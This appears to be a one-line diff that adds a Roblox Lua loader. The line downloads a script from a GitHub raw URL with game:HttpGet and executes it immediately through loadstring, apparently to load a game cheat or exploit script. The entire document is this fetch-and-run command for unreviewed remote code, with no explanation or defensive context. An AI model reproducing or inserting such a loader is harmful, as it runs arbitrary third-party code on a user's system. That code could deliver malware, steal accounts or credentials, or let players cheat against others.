@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ewyzu/ewyzu-mainHHH/main/ewyzu-AUT"))()
